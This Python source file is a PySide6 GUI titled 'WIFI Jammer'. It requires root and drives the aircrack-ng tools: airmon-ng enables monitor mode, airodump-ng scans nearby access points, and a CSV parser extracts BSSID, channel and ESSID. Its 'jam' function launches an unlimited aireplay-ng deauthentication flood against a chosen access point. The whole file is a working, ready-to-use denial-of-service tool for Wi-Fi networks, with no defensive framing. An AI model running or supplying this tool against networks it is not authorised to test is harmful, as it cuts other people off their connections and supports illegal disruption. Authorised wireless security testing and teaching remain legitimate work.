import subprocess
import os
import sys  
import csv
from time import sleep
from PySide6.QtWidgets import QApplication, QMainWindow
from src.ui import Ui_MainWindow


class Jammer(QMainWindow):

    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.setWindowTitle("WIFI Jammer")

        #chek if the user is root
        if not os.geteuid() == 0 :
            print  ("Run it as root")
            sys.exit(1)

        # Connect the buttons to the functions
        self.ui.start_dump_but.clicked.connect(self.start_dump)
        self.ui.jam_but.clicked.connect(self.jam)
        self.ui.stop_but.clicked.connect(self.stop)
        self.ui.scan_interface_but.clicked.connect(self.scan_interfaces)
        self.ui.start_monitor_but.clicked.connect(self.start_monitor)
        self.ui.stop_dump_but.clicked.connect(self.stop_dump)
        self.ui.manage_mode_but.clicked.connect(self.revert_managed_mode)
        self.ui.jam_but.setEnabled(False)
        self.ui.stop_but.setEnabled(False)
        self.ui.stop_dump_but.setEnabled(False)
        self.ui.start_dump_but.setEnabled(False)
        self.ui.start_monitor_but.setEnabled(False)
        self.ui.manage_mode_but.setEnabled(False)

    def scan_interfaces(self):

        result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Process the output to get the interface names
        self.interface_names = []
        self.wireless_interface_mon = None
        for line in result.stdout.splitlines():
            if 'IEEE 802.11' in line:
                interface_name = line.split()[0]
                self.interface_names.append(interface_name)
                if 'Mode:Monitor' in line:
                    self.wireless_interface_mon = interface_name
    
        # Update UI based on the detected interfaces
        self.ui.interface_combo.clear()
        for name in self.interface_names:
            self.ui.interface_combo.addItem(name)
    
        if self.wireless_interface_mon:
            self.ui.manage_mode_but.setEnabled(True)
            self.ui.start_dump_but.setEnabled(True)
            self.ui.start_monitor_but.setEnabled(False)
        else:
            self.ui.start_monitor_but.setEnabled(True)
    
        self.ui.scan_interface_but.setEnabled(False)

    def start_monitor(self):
        
        self.current_interface = self.ui.interface_combo.currentText()
        if not self.wireless_interface_mon:
            self.wireless_interface_mon = self.current_interface + "mon"
        subprocess.run(['airmon-ng','start',self.current_interface],stdout=subprocess.PIPE,text=True)
        sleep(0.5)
        self.ui.start_monitor_but.setEnabled(False)
        self.ui.manage_mode_but.setEnabled(True)
        self.ui.start_dump_but.setEnabled(True)

    def retrive_info(self, index):

        self.essid = []
        self.bssid = []
        self.channel = []
        with open("dump-01.csv", mode='r') as file:
            reader = csv.reader(file)
            for row in reader:
                if len(row) > 13:
                    var = row[index]  
                    if index == 0:   #index 0 is bssid
                        if var.strip():
                            self.bssid.append(var)
                    elif index == 3:  #insex 3 is channel
                        if var.strip():
                            self.channel.append(var)
                    elif index == 13:  #index 13 is essid
                        if var.strip():
                            self.essid.append(var)
                            self.ui.comboBox_2.addItem(var)
       

    def start_dump(self):

        os.system('clear')
        if os.path.exists('dump-01.csv'):
            os.remove('dump-01.csv')
        sleep(0.5)
        self.process = subprocess.Popen(
        ['airodump-ng', '--output-format', 'csv', '--write', 'dump', self.wireless_interface_mon])   
       
        self.ui.start_dump_but.setEnabled(False)
        self.ui.stop_dump_but.setEnabled(True)

 
    def stop_dump(self):

        subprocess.run(['pkill', 'airodump-ng'])
        self.process.terminate()
        self.process.kill()
        sleep(1)
        self.retrive_info(13)
        self.ui.jam_but.setEnabled(True)
        self.ui.stop_but.setEnabled(True)

    def revert_managed_mode(self):

        subprocess.run(['airmon-ng','stop',self.wireless_interface_mon],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        sleep(1)
        subprocess.run(['systemctl','restart','NetworkManager'])
        sleep(1)

        self.ui.scan_interface_but.setEnabled(True)
        self.ui.manage_mode_but.setEnabled(False)
        #self.scan_interfaces()

    def jam(self):

        current_essid = self.ui.comboBox_2.currentText()
        current_essid_index = self.ui.comboBox_2.currentIndex()
        self.retrive_info(0)
        self.ui.bssid_label.setText("BSSID: " + self.bssid[current_essid_index])
        current_bssid = self.bssid[current_essid_index]
        self.retrive_info(3)
        self.ui.channel_label.setText("Channel: " + self.channel[current_essid_index])
        current_channel = self.channel[current_essid_index]
        subprocess.run(['iwconfig', self.wireless_interface_mon, 'channel', current_channel])
        self.process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
        self.ui.jam_but.setEnabled(False)
   
    def stop(self):
        self.process.terminate()
        subprocess.run(['pkill', 'aireplay-ng'])
        os.system('clear')

if __name__ == "__main__":
    app = QApplication([])
    window = Jammer()
    window.show()
    app.exec()
        
